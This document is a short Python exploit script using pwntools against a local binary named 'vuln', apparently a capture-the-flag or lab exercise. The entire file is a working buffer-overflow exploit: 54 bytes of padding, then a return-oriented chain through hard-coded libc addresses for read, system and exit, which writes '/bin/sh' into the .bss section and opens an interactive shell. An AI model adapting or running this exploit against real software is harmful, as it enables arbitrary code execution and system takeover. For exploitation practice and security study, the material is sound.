from pwn import *
import time


p = process('./vuln')

read = 0xf7eca620
system = 0xf7e21d10
exit = 0xf7e14f70
bss = 0x0804a020

pop3ret = 0x080484d9
popret = 0x080484db

payload = "A"*54
payload += p32(read)
payload += p32(pop3ret)
payload += p32(0x0)
payload += p32(bss)
payload += p32(0x8)
payload += p32(system)
payload += p32(popret)
payload += p32(bss)
payload += p32(exit)

p.send(payload)
sleep(0.5)

p.send("/bin/sh\x00")
p.interactive()